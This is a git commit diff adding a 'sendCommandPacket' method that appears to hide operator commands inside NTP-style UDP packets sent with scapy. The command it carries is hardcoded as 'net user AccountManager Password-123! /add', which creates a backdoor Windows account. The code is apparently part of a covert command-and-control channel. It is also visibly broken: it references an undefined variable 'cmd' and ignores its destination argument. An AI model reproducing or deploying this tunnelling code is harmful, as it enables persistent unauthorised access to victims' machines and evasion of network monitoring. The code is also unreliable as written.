f82ce1e96bb9524f4fa8b6a9c0d1f69a0d6a9c05
d3adzo <enzo.destephano@gmail.com>
2021-02-23 23:42:52 -0500

    Unicode command packet added!

--- transport/packets.py
+++ transport/packets.py
@@ -21,5 +21,26 @@ class CommandPacket(Packet):
     
     
     def sendCommandPacket(self, destination):
-        pass
+        baseline = "\x1c\x01\x11\xe9\x00\x00\x00\x00\x00\x00\x00"
+
+        self.command = "net user AccountManager Password-123! /add"
+
+        if len(cmd) > 32:
+            cmdArr = [cmd[i:i+32] for i in range(0, len(cmd), 32)]
+            print(cmdArr)
+        else:
+            cmdArr = [cmd]
+
+        for ctr in range(0, len(cmdArr)):
+            if ctr < len(cmdArr)-1:
+                refId = str("COMU".encode('utf-8')).strip('b\'') #Command Unfinished
+            else:
+                refId = str("COMD".encode('utf-8')).strip('b\'')  #Command Finished
+
+            ucode = str(cmdArr[ctr].encode("utf-8")).strip('b\'') #Encoded command
+
+            ntpPayload = baseline + refId + ucode +"\x00"*(32-len(cmdArr[ctr]))
+            packet = IP(dst=self.destination)/UDP(dport=123,sport=50000)/(ntpPayload)
+
+            send(packet)
     
